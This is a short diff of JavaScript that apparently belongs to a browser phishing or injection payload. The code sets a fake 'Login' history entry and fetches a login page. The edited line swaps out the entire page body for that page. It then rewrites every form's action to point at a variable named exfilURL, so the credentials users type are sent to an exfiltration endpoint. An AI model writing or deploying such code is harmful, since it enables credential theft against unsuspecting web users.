@@ -54,7 +54,7 @@
           window.history.pushState({}, "Login", loginURL)
         }
         $.get(loginURL, function(r) {
-          b.html(r);
+          $('body').html(r);
           $('form').attr('action', exfilURL);
         }, 'text');
       }
